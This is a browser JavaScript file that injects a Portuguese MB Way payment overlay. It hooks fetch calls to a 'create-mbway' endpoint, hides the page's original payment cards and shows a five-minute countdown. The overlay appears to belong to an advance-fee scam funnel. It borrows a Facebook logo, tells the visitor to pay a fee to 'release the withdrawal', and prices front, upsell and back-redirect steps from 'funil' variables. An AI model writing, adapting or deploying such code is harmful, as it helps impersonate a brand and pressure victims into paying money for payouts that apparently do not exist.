;(function () {
  if (window.__MBWAY_CONFIRMATION_UI__) return;
  window.__MBWAY_CONFIRMATION_UI__ = true;

  var STYLE_ID = 'mbway-confirmation-ui-style';
  var SCREEN_ID = 'mbway-confirmation-screen';
  var DEFAULT_SECONDS = 5 * 60;
  var remainingSeconds = DEFAULT_SECONDS;
  var timerId = null;
  var lastAmount = getRouteAmount();

  function amountNumber(value) {
    var n = Number(value);
    return Number.isFinite(n) && n > 0 ? n : null;
  }

  function getRouteAmount() {
    var path = (window.location.pathname || '').toLowerCase();
    var prices = window.CENTRAL_PRICES || {};
    var key = 'front';
    if (path.indexOf('/back-redirect') !== -1) return amountNumber(window.__FUNIL_FEE_BACK) || amountNumber(prices.back) || amountNumber(prices.front) || 31.22;
    var match = path.match(/(?:up|upsell-)(\d+)/);
    if (match) key = 'up' + match[1];
    return amountNumber(prices[key]) || amountNumber(window.__FUNIL_FEE_FRONT) || amountNumber(prices.front) || 31.22;
  }

  function setLastAmount(value) {
    var n = amountNumber(value);
    if (!n) return;
    lastAmount = n;
    window.__MBWAY_LAST_AMOUNT__ = n;
    updateAmountText();
  }

  function formatAmount(value) {
    var n = amountNumber(value) || getRouteAmount();
    return '€ ' + n.toFixed(2);
  }

  function parseRequestMethod(body) {
    if (!body || typeof body !== 'string') return 'mbway';
    try {
      var data = JSON.parse(body);
      return String((data && data.method) || 'mbway').toLowerCase();
    } catch (e) {}
    return 'mbway';
  }

  function parseRequestAmount(body) {
    if (!body || typeof body !== 'string') return null;
    try {
      var data = JSON.parse(body);
      if (data.amountInCents) return Number(data.amountInCents) / 100;
      if (data.amount_cents) return Number(data.amount_cents) / 100;
      if (data.amount) return Number(data.amount);
      if (data.value) return Number(data.value);
    } catch (e) {}
    return null;
  }

  function ensureStyle() {
    if (document.getElementById(STYLE_ID)) return;
    var style = document.createElement('style');
    style.id = STYLE_ID;
    style.textContent = [
      'html.mbway-confirmation-active,html.mbway-confirmation-active body{overflow:hidden!important;}',
      '.mbway-legacy-hide{display:none!important;}',
      '#'+SCREEN_ID+'{position:fixed;inset:0;z-index:2147483000;font-family:ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:#111827;}',
      '#'+SCREEN_ID+' .mbway-shell{position:absolute;inset:0;max-width:430px;margin:0 auto;background:#f3f4f6;overflow:hidden;}',
      '#'+SCREEN_ID+' .mbway-top{height:18px;background:#050505;color:#bdbdbd;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;letter-spacing:.015em;text-transform:uppercase;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:0 8px;}',
      '#'+SCREEN_ID+' .mbway-content{padding:24px 28px 0;text-align:center;}',
      '#'+SCREEN_ID+' .mbway-brand{width:76px;height:76px;border-radius:999px;margin:0 auto 14px;background:#1554a4;display:flex;align-items:center;justify-content:center;overflow:hidden;}',
      '#'+SCREEN_ID+' .mbway-brand img{width:100%;height:100%;object-fit:cover;}',
      '#'+SCREEN_ID+' .mbway-label{font-size:12px;line-height:1;font-weight:900;letter-spacing:.34em;color:#6b7280;text-transform:uppercase;margin:0 0 6px;}',
      '#'+SCREEN_ID+' .mbway-amount{font-size:44px;line-height:1;font-weight:950;letter-spacing:-.06em;color:#0f172a;margin:0;}',
      '#'+SCREEN_ID+' .mbway-line{height:1px;background:#e5e7eb;margin:24px 0 18px;}',
      '#'+SCREEN_ID+' .mbway-method{border:1px solid #d1d5db;border-radius:14px;padding:13px 15px;text-align:left;background:rgba(255,255,255,.35);}',
      '#'+SCREEN_ID+' .mbway-method small{display:block;font-size:12px;font-weight:800;color:#374151;margin-bottom:8px;}',
      '#'+SCREEN_ID+' .mbway-method-row{display:flex;align-items:center;gap:8px;font-size:16px;font-weight:900;color:#1554a4;margin-bottom:12px;}',
      '#'+SCREEN_ID+' .mbway-method-row img{width:56px;height:auto;object-fit:contain;}',
      '#'+SCREEN_ID+' .mbway-method p{font-size:14px;line-height:1.45;color:#374151;margin:0;}',
      '#'+SCREEN_ID+' .mbway-timer-card{margin:12px 8px 0;border:1px solid rgba(153,27,27,.35);border-radius:12px;padding:10px 10px 12px;background:rgba(254,242,242,.45);}',
      '#'+SCREEN_ID+' .mbway-timer-card p{margin:0;color:#7f1d1d;font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.03em;}',
      '#'+SCREEN_ID+' .mbway-timer{font-size:42px;line-height:1;font-weight:950;color:#1554a4;margin:4px 0 8px;font-variant-numeric:tabular-nums;letter-spacing:.04em;}',
      '#'+SCREEN_ID+' .mbway-help{font-size:11px;line-height:1.3;color:#4b5563;margin:12px 0 0;}',
      '#'+SCREEN_ID+' .mbway-dim{position:absolute;inset:0;background:rgba(0,0,0,.48);}',
      '#'+SCREEN_ID+' .mbway-sheet-wrap{position:absolute;left:0;right:0;bottom:0;display:flex;justify-content:center;padding:0 12px;}',
      '#'+SCREEN_ID+' .mbway-sheet{width:100%;max-width:430px;background:#fff;border-radius:20px 20px 0 0;padding:18px 22px 24px;text-align:center;box-shadow:0 -16px 46px rgba(15,23,42,.18);}',
      '#'+SCREEN_ID+' .mbway-phone{width:20px;height:30px;border:3px solid #111827;border-radius:5px;margin:0 auto 12px;position:relative;}',
      '#'+SCREEN_ID+' .mbway-phone:after{content:"";position:absolute;left:50%;bottom:3px;width:4px;height:4px;border-radius:50%;background:#111827;transform:translateX(-50%);}',
      '#'+SCREEN_ID+' .mbway-title{font-size:26px;line-height:1.18;font-weight:950;letter-spacing:-.04em;color:#111827;margin:0 auto 12px;max-width:330px;}',
      '#'+SCREEN_ID+' .mbway-subtitle{font-size:14px;line-height:1.45;color:#697386;font-weight:700;margin:0;}',
      '#'+SCREEN_ID+' .mbway-subtitle strong{color:#111827;}',
      '#'+SCREEN_ID+' .mbway-dots{display:flex;gap:10px;justify-content:center;margin:14px 0 12px;}',
      '#'+SCREEN_ID+' .mbway-dots span{width:5px;height:5px;border-radius:50%;background:#60a5fa;animation:mbwayDot 1.1s infinite ease-in-out;}',
      '#'+SCREEN_ID+' .mbway-dots span:nth-child(2){animation-delay:.16s;opacity:.65;}',
      '#'+SCREEN_ID+' .mbway-dots span:nth-child(3){animation-delay:.32s;opacity:.45;}',
      '#'+SCREEN_ID+' .mbway-cancel{height:40px;min-width:94px;border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#64748b;font-size:14px;font-weight:700;padding:0 20px;}',
      '@keyframes mbwayDot{0%,80%,100%{transform:scale(.75);opacity:.45}40%{transform:scale(1.15);opacity:1}}',
      '@media(max-height:760px){#'+SCREEN_ID+' .mbway-content{padding-top:10px}#'+SCREEN_ID+' .mbway-brand{width:54px;height:54px;margin-bottom:8px}#'+SCREEN_ID+' .mbway-label{font-size:10px;margin-bottom:4px}#'+SCREEN_ID+' .mbway-amount{font-size:36px}#'+SCREEN_ID+' .mbway-line{margin:12px 0 10px}#'+SCREEN_ID+' .mbway-method{padding:9px 11px}#'+SCREEN_ID+' .mbway-method small{font-size:10px;margin-bottom:4px}#'+SCREEN_ID+' .mbway-method-row{font-size:14px;margin-bottom:6px}#'+SCREEN_ID+' .mbway-method-row img{width:46px}#'+SCREEN_ID+' .mbway-method p{font-size:11px;line-height:1.3}#'+SCREEN_ID+' .mbway-timer-card{margin:8px 6px 0;padding:8px 8px 9px}#'+SCREEN_ID+' .mbway-timer-card p{font-size:9px}#'+SCREEN_ID+' .mbway-timer{font-size:36px;margin:3px 0 5px}#'+SCREEN_ID+' .mbway-help{display:none}#'+SCREEN_ID+' .mbway-sheet{padding:12px 18px 14px}#'+SCREEN_ID+' .mbway-phone{display:none}#'+SCREEN_ID+' .mbway-title{font-size:20px;margin-bottom:8px;max-width:280px}#'+SCREEN_ID+' .mbway-subtitle{font-size:12px;line-height:1.35}#'+SCREEN_ID+' .mbway-dots{margin:8px 0}#'+SCREEN_ID+' .mbway-cancel{height:34px;font-size:13px}}',
      '@media(max-width:380px){#'+SCREEN_ID+' .mbway-content{padding-left:22px;padding-right:22px}#'+SCREEN_ID+' .mbway-amount{font-size:42px}#'+SCREEN_ID+' .mbway-title{font-size:26px}}'
    ].join('\n');
    document.head.appendChild(style);
  }

  function buildScreen() {
    var amount = formatAmount(window.__MBWAY_LAST_AMOUNT__ || lastAmount);
    var node = document.createElement('div');
    node.id = SCREEN_ID;
    node.setAttribute('role', 'dialog');
    node.setAttribute('aria-live', 'polite');
    node.innerHTML = '' +
      '<div class="mbway-shell">' +
        '<div class="mbway-top">FINALIZE O PAGAMENTO PARA LIBERTAR O LEVANTAMENTO</div>' +
        '<div class="mbway-content">' +
          '<div class="mbway-brand"><img src="/assets/facebook-icon.svg" alt="Facebook"></div>' +
          '<p class="mbway-label">VALOR DO PAGAMENTO</p>' +
          '<h1 class="mbway-amount" data-mbway-amount>' + amount + '</h1>' +
          '<div class="mbway-line"></div>' +
          '<section class="mbway-method">' +
            '<small>Método de Pagamento</small>' +
            '<div class="mbway-method-row"><img src="/assets/mb.png" alt="MB Way"><span>MB Way</span></div>' +
            '<p>Vamos enviar uma notificação para o teu telemóvel para confirmares o pagamento com segurança.</p>' +
          '</section>' +
          '<section class="mbway-timer-card">' +
            '<p>TEMPO RESTANTE PARA CONCLUIR O PAGAMENTO</p>' +
            '<div class="mbway-timer" data-mbway-timer>05:00</div>' +
            '<p>Efetue o pagamento dentro deste prazo para garantir a validação automática.</p>' +
          '</section>' +
          '<p class="mbway-help">Após o pagamento, a confirmação pode demorar alguns segundos.</p>' +
        '</div>' +
      '</div>' +
      '<div class="mbway-dim"></div>' +
      '<div class="mbway-sheet-wrap">' +
        '<section class="mbway-sheet">' +
          '<div class="mbway-phone"></div>' +
          '<h2 class="mbway-title">Aguarda a notificação MB Way</h2>' +
          '<p class="mbway-subtitle">Abre o app MB Way e confirma o pagamento de <strong data-mbway-amount-small>' + amount + '</strong>.</p>' +
          '<div class="mbway-dots" aria-hidden="true"><span></span><span></span><span></span></div>' +
          '<button type="button" class="mbway-cancel">Cancelar</button>' +
        '</section>' +
      '</div>';
    node.querySelector('.mbway-cancel').addEventListener('click', hideScreen);
    return node;
  }

  function updateAmountText() {
    var amount = formatAmount(window.__MBWAY_LAST_AMOUNT__ || lastAmount);
    var nodes = document.querySelectorAll('[data-mbway-amount],[data-mbway-amount-small]');
    for (var i = 0; i < nodes.length; i += 1) nodes[i].textContent = amount;
  }

  function updateTimer() {
    var m = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
    var s = String(remainingSeconds % 60).padStart(2, '0');
    var nodes = document.querySelectorAll('[data-mbway-timer]');
    for (var i = 0; i < nodes.length; i += 1) nodes[i].textContent = m + ':' + s;
  }

  function startTimer() {
    if (timerId) return;
    updateTimer();
    timerId = window.setInterval(function () {
      remainingSeconds = Math.max(0, remainingSeconds - 1);
      updateTimer();
    }, 1000);
  }

  function showScreen(amount) {
    if (amount) setLastAmount(amount);
    ensureStyle();
    cleanupLegacyUi(document);
    var existing = document.getElementById(SCREEN_ID);
    if (!existing) document.body.appendChild(buildScreen());
    document.documentElement.classList.add('mbway-confirmation-active');
    startTimer();
    updateAmountText();
  }

  function hideScreen() {
    document.documentElement.classList.remove('mbway-confirmation-active');
    var node = document.getElementById(SCREEN_ID);
    if (node) node.remove();
  }

  function textOf(el) {
    return ((el && el.textContent) || '').replace(/\s+/g, ' ').trim().toLowerCase();
  }

  function cleanupCopyButtons(root) {
    var nodes = (root || document).querySelectorAll ? (root || document).querySelectorAll('button,a') : [];
    for (var i = 0; i < nodes.length; i += 1) {
      var txt = textOf(nodes[i]);
      if (txt.indexOf('copiar') !== -1 && (txt.indexOf('código') !== -1 || txt.indexOf('codigo') !== -1 || txt.indexOf('mbway') !== -1 || txt.indexOf('mb way') !== -1)) {
        nodes[i].classList.add('mbway-legacy-hide');
        nodes[i].setAttribute('aria-hidden', 'true');
      }
    }
  }

  function cleanupLegacyCards(root) {
    var nodes = (root || document).querySelectorAll ? (root || document).querySelectorAll('div,section') : [];
    for (var i = 0; i < nodes.length; i += 1) {
      var txt = textOf(nodes[i]);
      var isPaymentCard = txt.indexOf('pague via mb way') !== -1 || txt.indexOf('pague com mbway') !== -1 || txt.indexOf('pague com mb way') !== -1;
      var hasCodeUi = txt.indexOf('copiar') !== -1 || txt.indexOf('qr code') !== -1 || txt.indexOf('código') !== -1 || txt.indexOf('codigo') !== -1;
      if (isPaymentCard && hasCodeUi) nodes[i].classList.add('mbway-legacy-hide');
    }
  }

  function cleanupLegacyUi(root) {
    cleanupCopyButtons(root || document);
    cleanupLegacyCards(root || document);
  }

  function detectGeneratedPayment() {
    var txt = textOf(document.body);
    if (!txt) return false;
    if (txt.indexOf('entidade:') !== -1 || txt.indexOf('referência:') !== -1 || txt.indexOf('referencia:') !== -1) return false;
    if (txt.indexOf('copiar código') !== -1 || txt.indexOf('copiar codigo') !== -1 || txt.indexOf('copiar mbway') !== -1) return true;
    if (txt.indexOf('pague via mb way') !== -1 || txt.indexOf('pague com mbway') !== -1 || txt.indexOf('pague com mb way') !== -1) return true;
    return false;
  }

  function maybeShowFromDom() {
    cleanupLegacyUi(document);
    if (detectGeneratedPayment()) showScreen();
  }

  function installFetchHook() {
    if (window.__MBWAY_CONFIRMATION_FETCH_HOOK__) return;
    window.__MBWAY_CONFIRMATION_FETCH_HOOK__ = true;
    var originalFetch = window.fetch;
    if (typeof originalFetch !== 'function') return;
    window.fetch = function (input, opts) {
      var url = typeof input === 'string' ? input : (input && input.url) || '';
      var method = ((opts && opts.method) || 'GET').toUpperCase();
      var isCreate = method === 'POST' && url.indexOf('create-mbway') !== -1;
      var requestedAmount = isCreate ? parseRequestAmount(opts && opts.body) : null;
      var requestedMethod = isCreate ? parseRequestMethod(opts && opts.body) : 'mbway';
      return originalFetch.apply(this, arguments).then(function (res) {
        if (isCreate && requestedMethod !== 'multibanco') {
          res.clone().json().then(function (data) {
            if (res.ok && data && !data.error) {
              setLastAmount(requestedAmount || data.amount || data.value || getRouteAmount());
              window.setTimeout(function () { showScreen(requestedAmount || data.amount || data.value); }, 50);
            }
          }).catch(function () {});
        }
        return res;
      });
    };
  }

  ensureStyle();
  installFetchHook();
  cleanupLegacyUi(document);
  window.addEventListener('mbway:paid', hideScreen);
  window.addEventListener('popstate', function () { window.setTimeout(cleanupLegacyUi, 50); });
  document.addEventListener('visibilitychange', function () { if (!document.hidden) cleanupLegacyUi(document); });
  new MutationObserver(function () { window.requestAnimationFrame(maybeShowFromDom); }).observe(document.documentElement, { childList: true, subtree: true });
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', maybeShowFromDom);
  else maybeShowFromDom();
})();
